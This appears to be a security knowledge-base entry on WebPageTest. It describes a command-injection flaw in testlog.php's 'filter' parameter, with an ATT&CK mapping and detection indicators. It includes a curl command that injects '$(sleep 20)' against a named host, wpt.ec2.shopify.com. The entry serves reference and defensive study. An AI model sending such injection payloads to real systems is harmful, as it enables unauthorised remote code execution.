---
id: tool-uuid-1
url: 'https://github.com/WPO-Foundation/webpagetest'
tags:
  - web-testing
  - vulnerable-app
type: tool
verified: false
platforms:
  - Web
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:41.120Z'
validated: true
submitted: true
---
# WebPageTest

**Status**: Unverified

## Overview

WebPageTest is an open-source tool for web performance testing, but in this context, it serves as the vulnerable application hosting a command injection flaw exploitable for RCE.

## Description

This PHP-based application, deployed on AWS EC2 with Apache, allows users to run tests and filter logs via a web interface. The vulnerability in testlog.php enables arbitrary command execution due to poor sanitization of the 'filter' GET parameter.

## Features

- Feature 1: Web-based performance testing and log filtering
- Feature 2: Integration with exec() for grep-based searches
- Feature 3: Open-source codebase for review and exploitation

## Installation

### Requirements

- PHP environment
- Apache web server
- AWS EC2 instance

### Install Commands

```bash
# Clone from GitHub
git clone https://github.com/WPO-Foundation/webpagetest.git
# Deploy to web server
```

## Basic Usage

```bash
# Access via browser: http://host/testlog.php?filter=pattern
```

### Common Options

| Option | Description |
|--------|-------------|
| filter | Search pattern for logs |
| days | Number of days for log scope |

## Examples

### Example 1: Basic Usage

```bash
# Vulnerable access
curl "http://wpt.ec2.shopify.com/testlog.php?days=1&filter=test"
```

### Example 2: Advanced Usage

```bash
# Injection example (not for production)
curl "http://wpt.ec2.shopify.com/testlog.php?days=1&filter=$(sleep%2020)"
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exploit Public-Facing Application]]
- [[Unix Shell]]

### Tactics

- [[Execution]]

## Detection

Indicators and methods for detecting this tool's usage:

- Anomalous exec() calls in PHP logs
- Delays or external connections from the web process

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[Burp Suite]]
- [[GitHub]]

## References

- Official documentation: https://www.webpagetest.org/
- GitHub repo: https://github.com/WPO-Foundation/webpagetest
